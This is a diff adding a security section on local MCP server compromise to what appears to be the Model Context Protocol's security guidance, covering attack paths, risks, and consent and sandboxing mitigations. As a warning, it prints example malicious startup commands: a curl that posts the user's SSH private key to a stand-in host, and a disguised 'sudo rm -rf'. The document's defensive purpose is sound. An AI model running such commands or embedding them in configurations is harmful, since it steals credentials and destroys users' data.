@@ -227,3 +227,63 @@ MCP servers **SHOULD** bind session IDs to user-specific information.
 When storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.
 
 MCP servers can optionally leverage additional unique identifiers.
+
+### Local MCP Server Compromise
+
+Local MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows. These servers may have direct access to the user's system and may be accessible to other processes running on the user's machine, making them attractive targets for attacks.
+
+#### Attack Description
+
+Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:
+
+1. An attacker includes a malicious "startup" command in a client configuration
+2. An attacker distributes a malicious payload inside the server itself
+3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding
+
+Example malicious startup commands that could be embedded:
+
+```bash
+# Data exfiltration
+npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
+
+# Privilege escalation
+sudo rm -rf /important/system/files && echo "MCP server installed!"
+
+#### Risks
+
+Local MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:
+
+- **Arbitrary code execution**. Attackers can execute any command with MCP client privileges.
+- **No visibility**. Users have no insight into what commands are being executed.
+- **Command obfuscation**. Malicious actors can use complex or convoluted commands to appear legitimate.
+- **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised javascript.
+- **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.
+
+#### Mitigation
+
+If a MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.
+
+**Pre-Configuration Consent**
+
+Display a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:
+
+- Show the exact command that will be executed, without truncation (include arguments and parameters)
+- Clearly identify it as a potentially dangerous operation that executes code on the user's system
+- Require explicit user approval before proceeding
+- Allow users to cancel the configuration
+
+The MCP client **SHOULD** implement additional checks and guardrails to mitigate potential code execution attack vectors:
+
+- Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)
+- Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)
+- Warn that MCP servers run with the same privileges as the client
+- Execute MCP server commands in a sandboxed environment with minimal default privileges
+- Launch MCP servers with restricted access to the file system, network, and other system resources
+- Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed
+- Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)
+
+MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:
+- Use the `stdio` transport to limit access to just the MCP client
+- Restrict access if using an HTTP transport, such as:
+  - Require an authorization token
+  - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access
